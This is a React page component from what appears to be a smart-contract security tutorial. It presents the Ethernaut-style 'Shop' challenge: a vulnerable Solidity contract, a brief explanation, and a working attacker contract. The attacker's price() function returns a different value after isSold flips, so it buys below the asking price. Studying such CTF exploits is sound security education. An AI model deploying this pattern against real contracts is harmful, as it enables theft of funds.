import { useState } from "react";
import { Light as SyntaxHighlighter } from "react-syntax-highlighter";
import { atomOneDark } from "react-syntax-highlighter/dist/esm/styles/hljs";
import { AiFillCopy, AiOutlineFileDone } from "react-icons/ai";
import TextDiv from "../../components/TextDiv";

const Shop = () => {
  const [copy, setCopy] = useState(false);
  const codeString = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}`;

  const solutionCode = `
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.0;
  
  interface IShop {
      function buy() external;
      function isSold() external view returns (bool);
      function price() external view returns (uint);
  }
  
  contract BuyerAttack {
  
      function price() external view returns (uint) {
          bool isSold = IShop(msg.sender).isSold();
          uint askedPrice = IShop(msg.sender).price();
  
          if (!isSold) {
              return askedPrice;
          }
  
          return 0;
      }
  
      function buyFromShop(address _shopAddr) public {
          IShop(_shopAddr).buy();
      }
  }
`;

  return (
    <div>
      <h1 className="headerText">Shop</h1>
      <div className="content">
        <div className="highlighterHeader">
          <p className="smallText"> Example code</p>
          {copy ? (
            <button className="copyButton">
              <span>
                <AiOutlineFileDone />
              </span>
              Copied!
            </button>
          ) : (
            <button
              className="copyButton"
              onClick={() => {
                navigator.clipboard.writeText(codeString);
                setCopy(true);
                setTimeout(() => {
                  setCopy(false);
                }, 3000);
              }}
            >
              <span>
                <AiFillCopy />
              </span>
              Copy Code
            </button>
          )}
        </div>
        <SyntaxHighlighter
          language="solidity"
          style={atomOneDark}
          customStyle={{
            padding: "25px",
            borderRadius: "0.375rem",
          }}
          wrapLongLines={true}
        >
          {codeString}
        </SyntaxHighlighter>
      </div>
      <div className="textBox">
        <TextDiv
          title="Hack"
          text="Becouse we can change buyer contract address, we can put our own logic, so when we first call price we return greater or equal to current price, but after that, isSold changed, and
          we can return another value"
        />
      </div>
      <SyntaxHighlighter
        language="solidity"
        style={atomOneDark}
        customStyle={{
          padding: "25px",
          borderRadius: "0.375rem",
        }}
        wrapLongLines={true}
      >
        {solutionCode}
      </SyntaxHighlighter>
    </div>
  );
};

export default Shop;
